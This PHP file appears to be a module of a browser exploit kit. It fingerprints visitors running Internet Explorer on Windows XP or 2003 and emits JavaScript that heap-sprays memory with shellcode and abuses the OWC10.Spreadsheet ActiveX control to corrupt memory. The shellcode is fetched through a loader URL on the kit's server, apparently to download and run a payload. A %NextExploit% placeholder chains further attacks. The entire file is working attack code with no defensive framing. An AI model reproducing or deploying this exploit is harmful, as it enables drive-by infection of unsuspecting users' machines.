<?php



if ($UAinfo['browser'] == "MSIE" AND ($UAinfo['platform'] == "XP" OR $UAinfo['platform'] == "2003")){
	$expname = "spreadsheet";
	$exploits[] = "
	function spreadsheet(){
		try {
			var objspread = new ActiveXObject('OWC10.Spreadsheet');
		} catch (e) {}
		if (objspread){
			try {
				var shellcode = unescape(\"" . ShellCode::get($config['UrlToFolder'] . "load.php?e=8") . "\");
				var array = new Array();
				var ls = 0x81000 - (shellcode.length * 2);
				var bigblock = unescape(\"%u0b0c%u0b0C\");
				while (bigblock.length < ls / 2){
					bigblock += bigblock;
				}
				var lh = bigblock.substring(0, ls / 2);
				delete bigblock;
				for (var i = 0; i < 0x99*2; i++){
					array[i] = lh + lh + shellcode;
				}
				CollectGarbage();
				var objspread = new ActiveXObject(\"OWC10.Spreadsheet\");
				e = new Array();
				e.push(1);
				e.push(2);
				e.push(0);
				e.push(window);
				for (i = 0; i < e.length; i++){
					for (j = 0; j < 10; j++){
						try {
							objspread.Evaluate(e[i]);
						} catch(e) {}
					}
				}
				window.status = e[3] + \"\";
				for (j = 0; j < 10; j++){
					try {
						objspread.msDataSourceObject(e[3]);
					} catch(e) {}
				}
			} catch (e) {}
		}
		%NextExploit%
	}
	";
}


?>